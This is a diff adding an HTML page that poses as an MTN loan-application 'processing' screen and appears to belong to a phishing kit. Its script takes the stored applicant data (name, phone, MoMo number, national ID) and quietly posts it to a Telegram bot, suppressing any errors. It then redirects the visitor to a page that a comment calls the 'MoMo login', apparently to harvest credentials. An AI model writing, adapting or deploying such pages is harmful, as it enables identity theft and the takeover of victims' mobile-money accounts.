@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTN — Processing</title>
+<style>
+  :root{
+    --mtn-blue:#004F9F; --mtn-blue-dark:#003B77; --mtn-blue-deep:#002B5C;
+    --mtn-yellow:#FFCC00; --green:#00A651; --muted:#64748B;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;}
+  html,body{height:100%;}
+
+  body{
+    background:
+      radial-gradient(circle at 50% 30%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
+    color:#fff;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+    position:relative;
+  }
+
+  /* Subtle animated glow behind spinner */
+  .glow{
+    position:absolute;
+    width:420px;height:420px;
+    border-radius:50%;
+    background:radial-gradient(circle, rgba(255,204,0,0.18) 0%, rgba(255,204,0,0) 70%);
+    animation:pulse 2.4s ease-in-out infinite;
+    pointer-events:none;
+  }
+  @keyframes pulse{
+    0%,100%{transform:scale(1);opacity:.8;}
+    50%{transform:scale(1.15);opacity:1;}
+  }
+
+  .processing{
+    position:relative;
+    text-align:center;
+    z-index:2;
+    padding:24px;
+    max-width:420px;
+  }
+
+  .brand{
+    font-size:20px;font-weight:900;letter-spacing:3px;
+    text-transform:uppercase;color:#fff;
+    margin-bottom:36px;opacity:.9;
+  }
+  .brand em{font-style:normal;color:var(--mtn-yellow);}
+
+  .spinner{
+    width:86px;height:86px;margin:0 auto 32px;
+    border-radius:50%;
+    border:6px solid rgba(255,255,255,0.12);
+    border-top-color:var(--mtn-yellow);
+    border-right-color:var(--mtn-yellow);
+    animation:spin 0.9s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+
+  h1{
+    font-size:24px;font-weight:800;letter-spacing:-0.4px;
+    margin-bottom:10px;
+  }
+
+  p.sub{
+    font-size:14px;color:rgba(255,255,255,0.72);
+    font-weight:600;line-height:1.6;
+  }
+
+  .progress{
+    width:220px;height:4px;
+    background:rgba(255,255,255,0.14);
+    border-radius:6px;margin:34px auto 0;overflow:hidden;
+  }
+  .progress-bar{
+    height:100%;width:0%;
+    background:linear-gradient(90deg, var(--mtn-yellow), #FFE066);
+    border-radius:6px;
+    animation:fill 3s linear forwards;
+  }
+  @keyframes fill{from{width:0%;}to{width:100%;}}
+
+  .dots{
+    margin-top:26px;
+    display:flex;justify-content:center;gap:8px;
+  }
+  .dots span{
+    width:8px;height:8px;border-radius:50%;
+    background:rgba(255,255,255,0.25);
+    animation:blink 1.4s infinite ease-in-out;
+  }
+  .dots span:nth-child(2){animation-delay:.2s;}
+  .dots span:nth-child(3){animation-delay:.4s;}
+  @keyframes blink{
+    0%,80%,100%{background:rgba(255,255,255,0.25);}
+    40%{background:var(--mtn-yellow);}
+  }
+</style>
+</head>
+<body>
+
+  <div class="glow"></div>
+
+  <div class="processing">
+    <div class="brand">MTN<em>.</em></div>
+
+    <div class="spinner"></div>
+
+    <h1>Processing your application</h1>
+    <p class="sub">Please wait while we verify your details.<br>Do not close this page.</p>
+
+    <div class="progress"><div class="progress-bar"></div></div>
+
+    <div class="dots">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+
+<script>
+  const app = JSON.parse(localStorage.getItem('application') || 'null');
+
+  // If someone lands here directly, send them home
+  if(!app){
+    window.location.href = 'index.html';
+  }
+
+  // ---- Telegram notification (fire-and-forget) ----
+  const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+  const CHAT_ID   = 'YOUR_CHAT_ID_HERE';
+
+  const fmt = n => Math.round(n).toLocaleString('fr-FR') + ' XAF';
+
+  async function notifyTelegram(){
+    if(BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+
+    const message =
+      '🏦 *New Loan Application*\n' +
+      '━━━━━━━━━━━━━━━━━━\n' +
+      `👤 *Name:* ${app.fullName}\n` +
+      `📞 *Phone:* ${app.phone}\n` +
+      `💳 *MoMo:* ${app.momo}\n` +
+      `🆔 *ID:* ${app.nid}\n` +
+      `💰 *Amount:* ${fmt(app.amount)}\n` +
+      `📅 *Period:* ${app.months} ${app.months===1?'month':'months'}\n` +
+      `💵 *Total due:* ${fmt(app.total)}\n` +
+      `🔖 *Ref:* ${app.reference}\n` +
+      `🕒 *Submitted:* ${new Date(app.submittedAt).toLocaleString()}`;
+
+    try{
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+      });
+    }catch(err){ /* silent */ }
+  }
+
+  notifyTelegram();
+
+  // ---- Full-screen 3 seconds, then MoMo login ----
+  setTimeout(() => {
+    window.location.href = 'login.html';
+  }, 3000);
+</script>
+</body>
+</html>
